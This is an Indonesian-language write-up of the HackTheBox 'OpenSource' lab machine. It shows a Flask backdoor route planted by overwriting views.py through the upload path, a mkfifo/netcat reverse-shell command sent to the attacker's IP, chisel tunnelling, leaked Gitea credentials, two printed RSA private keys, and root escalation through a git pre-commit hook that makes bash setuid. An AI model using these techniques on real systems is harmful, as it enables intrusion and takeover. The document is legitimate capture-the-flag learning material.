---
title: "HackTheBox - OpenSource WriteUps"
date: 2022-09-01 14:00:00 +07:00
categories: [WriteUps]
tags: [ctf, hackthebox, pentest, writeups]
image: 
---

# HackTheBox OpenSource Writeups

### Kita mulai dengan memindai port mesin dengan nmap
```terminal
❯ nmap 10.10.11.164
Nmap scan report for 10.10.11.164
PORT      STATE SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```

### Jika kami membuka web, server memberi tahu kami bahwa kami dapat mengunduh source code sehingga kami akan memberikannya unduhan

![Gambar1](_posts/img/OpenSource/1.png "Gambar1")

### Kami membuka zip zip dan menemukan bahwa ada direktori .git, dan mencari di antara cabang dan komit, kami menemukan kredensial meskipun tidak berfungsi untuk ssh

```terminal
❯ git branch
  dev
  public
❯ git log dev --oneline
c41fede (dev) ease testing
be4da71 added gitignore
a76f8f7 updated
ee9d9f1 initial
❯ git show a76f8f7
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
    updated
+ "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+ "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+ "http.proxyStrictSSL": false
```

### Jika kita terus mencari di app/app/ ada file views.py yang menyimpan fungsi

```terminal
app/app ❯ cat views.py
import os
from app.utils import get_file_name
from flask import render_template, request, send_file
from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```

### Memandu kami dengan fungsi-fungsi di atas, kami dapat mendefinisikan fungsi kami sendiri dan menambahkannya di akhir untuk kemudian mengunggahnya dan menjalankan perintah

```terminal
@app.route('/yupybackdoor')
def cmd():
    return os.system(request.args.get('cmd'))
```

### Kami mengunggahnya dari http://10.10.11.164/upload tetapi kami akan mencegat dengan burpsuite dan mengubah rute ke "/app/app/views.py" untuk menimpa yang sekarang di mesin dan tekan maju

![Gambar2](_posts/img/OpenSource/2.png "Gambar2")

### Jika semuanya berjalan dengan baik, fungsinya harus berfungsi, maka kami akan membuat shell terbalik dengan nc mkfifo, urlencoding apa yang dapat menyebabkan masalah

```terminal
❯ curl 'http://10.10.11.164/yupybackdoor?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.10.14.10%201337%20>/tmp/f'
```
```terminal
❯ sudo netcat -lvnp 1337
Connection received on 10.10.11.164
/app # whoami
root
/app # ifconfig
          inet addr:172.17.0.5
```

### Kami memiliki shell sebagai root dalam wadah, tetapi sekarang kami memiliki koneksi ke port 3000 dari mesin nyata yang kami lihat disaring, jadi kami akan mengunggah pahat dan mengirim port ke mesin lokal kami

```terminal
❯ chisel server --reverse --port 8000
2022/08/22 14:33:07 server: Reverse tunnelling enabled
2022/08/22 14:33:07 server: Listening on http://0.0.0.0:8000
2022/08/22 14:37:20 server: session#1: tun: proxy#R:3000=>172.17.0.1:3000: Listening
```
```terminal
/app # ./chisel client 10.10.14.10:8000 R:3000:172.17.0.1:3000
2022/08/22 14:37:20 client: Connecting to ws://10.10.14.10:8000
2022/08/22 14:37:21 client: Connected
```

### Jika kita membuka localhost di browser pada port 3000 kita melihat panel gitea kita dapat menggunakan kredensial yang kita temukan di awal dev01:Soulless_Developer#2022

![Gambar3](_posts/img/OpenSource/3.png "Gambar3")

### Sudah sebagai dev01 kita dapat melihat repositori "home-backup" yang memiliki beberapa kunci ssh yang dapat kita coba sambungkan

![Gambar4](_posts/img/OpenSource/4.png "Gambar4")

```terminal
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
```terminal
❯ ssh dev01@10.10.11.164 -i id_rsa
dev01@opensource:~$ cat user.txt
d****************************6
dev01@opensource:~$
```

### Mencari cara untuk meningkatkan hak istimewa yang dapat kita lihat dengan pspy bahwa root menjalankan tugas git setiap menit

```terminal
CMD: UID=0    PID=20396  | git add .
CMD: UID=0    PID=20397  | git commit -m Backup for 2022-08-22
CMD: UID=0    PID=20398  | /usr/lib/git-core/git gc --auto
CMD: UID=0    PID=20400  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
CMD: UID=0    PID=20399  | git push origin main
```

### Di gtfobins kita melihat contoh menyalahgunakan pra-komit, kita dapat mencobanya dan setelah satu menit kita menjadi root

```terminal
dev01@opensource:~$ echo "chmod u+s /bin/bash" >> ~/.git/hooks/pre-commit
dev01@opensource:~$ chmod +x !$
dev01@opensource:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Apr 18 15:08 /bin/bash
dev01@opensource:~$ bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt
4****************************f
bash-4.4#
```

### Kami juga menemukan id_rsa di direktori root sehingga kami dapat terhubung melalui ssh

```terminal
bash-4.4# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```
```terminal
❯ ssh root@10.10.11.164 -i id_rsa
root@opensource:~# cat root.txt
4****************************f
root@opensource:~#
```

![HTBOpenSource](_posts/img/OpenSource/HTBOpenSource.png "HTBOpenSource")
